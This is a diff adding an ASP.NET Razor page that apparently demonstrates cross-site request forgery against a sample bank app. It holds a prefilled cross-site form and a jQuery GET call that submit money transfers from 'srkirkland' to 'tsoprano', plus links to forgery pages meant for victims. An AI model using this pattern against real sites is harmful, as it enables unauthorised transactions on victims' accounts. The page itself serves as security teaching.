@@ -1,0 +1,44 @@
+﻿@{
+    ViewBag.Title = "Index";
+    var bankUrl = System.Web.Configuration.WebConfigurationManager.AppSettings["GoodUrl"] + "/Bank/TransferMoney";
+}
+
+<h2>Welcome to shady money reclaimers anonymous</h2>
+
+<h3>Let's try to reclaim some money for Tony Soprano</h3>
+
+<ol>
+    <li>
+        <a href="#" id="direct-post">Try to get a money transfer directly</a>
+    </li>
+    <li>
+        Click button to generate a post transfer to steal money 
+        <fieldset>
+            <legend>Aquire More Money</legend>            
+            <form action="@bankUrl" method="post">
+                From: <input type="text" name="from" value="srkirkland" /><br />
+                To: <input type="text" name="to" value="tsoprano" /><br />
+                Amount: <input type="text" name="amount" value="100" /><br />
+                <button type="submit">Give to the poor mob boss</button>
+            </form>
+        </fieldset>
+    </li>
+</ol>
+
+<h3>We don't have permission.  Let's try CSRF attacks!</h3>
+
+GET request ==> @Html.ActionLink("Get your victim to visit this site", "GetForgeryPage")
+
+<br /><br />
+POST request ==> @Html.ActionLink("Get your victim to visit this site", "PostForgeryPage")
+
+<script>
+    $(function () {
+        $("#direct-post").click(function () {
+            var postUrl = '@bankUrl';
+            var data = { from: 'srkirkland', to: 'tsoprano', amount: 100 };
+
+            $.get(postUrl, data);
+        });
+    });
+</script>
